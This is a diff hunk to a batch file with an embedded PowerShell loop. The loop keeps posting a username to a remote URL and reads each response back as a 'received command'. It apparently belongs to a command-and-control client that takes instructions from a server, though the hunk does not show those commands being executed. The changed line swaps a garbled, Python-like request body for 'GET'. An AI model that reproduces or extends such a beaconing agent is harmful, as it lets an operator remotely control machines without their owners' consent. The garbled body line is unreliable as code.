@@ -10,7 +10,7 @@ powershell -NoProfile -Command ^
     "$ErrorActionPreference = 'Stop';" ^
     "while ($true) {" ^
     "    Write-Host \"Sending POST request to $url\";" ^
-    "    $body = \"$username$separator\" + 'reply = self.dynamikresponses[$username]';" ^
+    "    $body = \"$username$separator\" + 'GET';" ^
     "    $headers = @{'Content-Type' = 'application/x-www-form-urlencoded'};" ^
     "    $response = Invoke-WebRequest -Uri $url -Method Post -Body $body -Headers $headers -TimeoutSec 20;" ^
     "    $receivedCommand = $response.Content.Trim();" ^
